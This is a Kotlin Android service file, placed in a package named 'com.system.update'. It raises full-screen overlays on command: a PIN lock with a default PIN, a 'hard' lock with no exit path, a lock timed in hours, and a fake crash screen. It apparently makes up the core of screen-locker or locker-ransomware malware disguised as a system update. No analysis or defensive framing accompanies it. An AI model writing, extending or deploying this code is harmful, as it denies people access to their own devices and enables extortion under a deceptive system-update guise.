package com.system.update

import android.app.Service
import android.content.Context
import android.content.Intent
import android.graphics.PixelFormat
import android.os.Build
import android.os.IBinder
import android.view.Gravity
import android.view.View
import android.view.WindowManager

class LockService : Service() {

    companion object {
        @Volatile var currentOverlay: View? = null
        @Volatile var currentType: String? = null
    }

    private lateinit var wm: WindowManager

    override fun onCreate() {
        super.onCreate()
        wm = getSystemService(Context.WINDOW_SERVICE) as WindowManager
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val type = intent?.getStringExtra("type") ?: return START_STICKY
        val pin = intent.getStringExtra("pin") ?: "1234"
        val hours = intent.getLongExtra("hours", 5L)

        showOverlay(type, pin, hours)
        return START_STICKY
    }

    private fun showOverlay(type: String, pin: String, hours: Long) {
        if (currentOverlay != null && currentType == type) return

        removeOverlay()

        val view: View = when (type) {
            "pin" -> LockOverlayView.buildPin(this, pin) { v ->
                removeOverlay()
                v.let { try { wm.removeView(it) } catch (_: Exception) {} }
            }
            "hard" -> LockOverlayView.buildHard(this)
            "time" -> LockOverlayView.buildTimer(this, hours * 3600_000L) { v ->
                removeOverlay()
                v.let { try { wm.removeView(it) } catch (_: Exception) {} }
            }
            "crash" -> LockOverlayView.buildCrash(this) { v ->
                removeOverlay()
                v.let { try { wm.removeView(it) } catch (_: Exception) {} }
            }
            else -> return
        }

        try {
            wm.addView(view, LockOverlayView.paramsFull())
            currentOverlay = view
            currentType = type
        } catch (_: Exception) {}
    }

    fun removeOverlay() {
        try {
            currentOverlay?.let { wm.removeView(it) }
        } catch (_: Exception) {}
        currentOverlay = null
        currentType = null
    }

    override fun onDestroy() {
        removeOverlay()
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
